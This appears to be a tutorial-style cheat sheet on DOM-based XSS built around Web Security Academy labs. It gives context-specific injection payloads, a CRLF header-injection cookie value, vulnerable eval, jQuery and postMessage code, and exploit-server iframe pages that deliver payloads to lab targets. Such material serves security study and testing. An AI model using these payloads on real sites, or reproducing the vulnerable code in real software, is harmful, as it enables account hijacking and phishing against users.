## What is DOM-Based XSS?  
DOM-based Cross-Site Scripting (DOM XSS) vulnerabilities arise when JavaScript takes data from an attacker-controllable source and passes it to a sink that supports dynamic code execution. This allows attackers to execute malicious JavaScript, potentially leading to account hijacking and other serious breaches. 
##### ***Testing for DOM based XSS***
To test for DOM based XSS, use the developer tools to discover where your input is located in the HTML, then find out what context it is being used in.
##### ***HTML Context***
- When user input appears directly within the HTML, it might be possible to insert malicious HTML code.
`<img src=x onerror=alert('XSS')>`
##### ***Attribute Context***
- If user input is placed within an HTML attribute, you can break out of that attribute using quotes and then execute JavaScript.
`\"onmouseover="alert('XSS')"`
##### ***JavaScript Context***
- If user input is embedded within a JavaScript context, the attacker can break out of the context using appropriate syntax.
`;alert('XSS');//`
##### ***URL Context***
- If user input is part of a URL (such as in the href attribute of a link), it might be possible to craft a `javascript:` URL to execute code.
`javascript:alert('XSS')`
##### ***CSS Context***
- User input within CSS can be exploited by crafting malicious CSS that triggers JavaScript execution, although this is usually more complex and dependent on specific browser quirks.
`expression(alert('XSS'))`
##### ***JSON Context***
- If the untrusted data is used in a JSON object, breaking out of the object might allow injection of arbitrary JavaScript.
`{"name":"value"}; alert('XSS');`
##### ***Comment Context***
- If the untrusted data ends up inside an HTML comment, you might be able to break out of the comment and insert HTML or JavaScript.
`--><script>alert('XSS')</script><!--`
##### ***innerHTML context***
- Using user input directly with `.innerHTML` can lead to DOM XSS if the input contains malicious HTML or JavaScript. 
`<img src=x onerror=alert(1)>`
***Header context***
- If you are having user input reflected in the headers, like a cookie being set, use a carriage return `%0d%0a` to make the next value on a new line.
`test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`
## Examples of Attacks
### Vanilla JavaScript
##### ***Insecure eval() function***
This is inherently insecure as it is using eval to concatenate the response into a variable. 
```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		eval('var searchResultsObj = ' + this.responseText);
		displaySearchResults(searchResultsObj);
	}
};
xhr.open("GET", path + window.location.search);
xhr.send();
```

You can exploit this by sending to the repeater in burp-suite and modifying the request string until you can break out of the eval string. E.g
	`GET /search-results?search=AS\"-alert('xss')}//`
	
You will get this response, and as you can see it breaks out of the string.
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

{"results":[],"searchTerm":"AS\\"-alert('xss')}//"}
```
##### ***Open redirect***
An open redirect attack occurs when an application improperly redirects users to a URL from user-controlled input without validation. This can be used by attackers to redirect users to malicious websites, potentially leading to phishing attacks or other malicious activities.

Here's a simple example of how an open redirect vulnerability might be introduced in code, and how an attacker might exploit it.

**Vulnerable Code Example (PHP)**
Suppose a web application has the following PHP code to redirect users to a URL specified in the `url` parameter:
`<?php   $url = $_GET['url'];   header("Location: " . $url);   exit(); ?>`

This code takes the `url` parameter directly from the query string and uses it to set the `Location` header, redirecting the user to that URL.

**Exploiting the Open Redirect**
An attacker could craft a link to the vulnerable site that includes a malicious URL as the `url` parameter:
`https://vulnerable-site.com/redirect.php?url=https://malicious-site.com`

If a user clicks on this link, they will be redirected to `https://malicious-site.com`, which could be a phishing site or contain malicious content.
### JQuery
##### ***Href input coming from URL***
The `.attr()` method is a dangerous function as it alters the DOM element's attributes, in this example it is changing the href attribute to the value of the `returnPath` query string.
```
$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
##### ***Hash change event exploited and delivered to victim via an iframe***
In JQuery it is common to use the `hashchange` method for the `$(window).on`  function to get the value after the hash in the URL. This can be exploited by inserting malicious JavaScript after the hash and creating and hosting a website that can deliver this with an iframe.

```
	<html>
		<body style="width: 100vw; height: 100vw;">
		<iframe name="initial" src="https://0a680050041586058224a1d600ef0051.web-security-academy.net/#" onload="if (this.name === 'initial') { this.src +='<img src=x onerror=print()>' ; this.name='loaded'; }">
		</body>
	</html>
```

You can host this code on a website and deliver it to the victim. For example URL: https://exploit-0a87009d04b586d18291a08a01bf009b.exploit-server.net/exploit
##### ***DOM XSS with web messages***
If a website is receiving messages through the event listener and listening for the `message` event, you can exploit this with an exploit server and an iframe to post malicious JavaScript, this is vulnerable:
```javascript
<script>
	window.addEventListener('message', function(e) {
		document.getElementById('ads').innerHTML = e.data;
	})
</script>
```

The `window.postmessage()` method allow cross-origin communication between window objects, or a page with an iframe embedded in it. To exploit this, you can create an exploit server with this content:
```html
<head>
	<style>
		#target_website {
			width: 100%;
			height: 100%;
			box-sizing: border-box;
			}
	</style>
</head>
<iframe id="target_website" scrolling="no" frameborder="0" src="https://0a4f0023040e600f82fb5638001b00e9.web-security-academy.net"></iframe>
<script>
        let iframe = document.getElementById('target_website');

        iframe.addEventListener('load', function() {
            iframe.contentWindow.postMessage('<img src=x onerror=print()>','https://0a4f0023040e600f82fb5638001b00e9.web-security-academy.net');
        });
</script>
```

Here is a vulnerable open redirection that changes the URL with `location.href`, this code does not perform any checks against the origin, and the strings `https` and `http` can be anywhere in the `e.data` object.
```javascript
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
			location.href = url;
		}
	}, false);
</script>
```

This can be exploited by crafting an exploit server that posts a message to the vulnerable site through an iframe with the URL being a JavaScript function.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

This website also contains vulnerable code that uses `JSON.parse` to parse a string from the message.
```javascript
<script>
	window.addEventListener('message', function(e) {
		var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
		document.body.appendChild(iframe);
		try {
			d = JSON.parse(e.data);
		} catch(e) {
			return;
		}
		switch(d.type) {
			case "page-load":
				ACMEplayer.element.scrollIntoView();
				break;
			case "load-channel":
				ACMEplayer.element.src = d.url;
				break;
			case "player-height-changed":
				ACMEplayer.element.style.width = d.width + "px";
				ACMEplayer.element.style.height = d.height + "px";
				break;
		}
	}, false);
</script>
```

This can be exploited by sending a string as JSON that exploits the generated iframe's `src`. This will place the `javascript:print()` function into the iframe's `src`, allowing arbitrary code execution.
``` javascript
<head>
	<style>
		#target {
			width: 100%;
			height: 100%;
			box-sizing: border-box;
			}
	</style>
</head>
<iframe id="target" src="https://vulnerable-site.com" frameborder="0" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}", "*")'>
```
##### ***Angular***
##### ***Template injection***
https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
##### ***How to Defend Against DOM XSS***
- ***Input Sanitation***: Ensure that all user inputs are properly sanitized before being processed.
- ***Content Security Policy (CSP)***: Implementing CSP can prevent the execution of unauthorized scripts.
- ***Regular Security Audits***: Regularly review and test your application to identify and fix potential vulnerabilities.










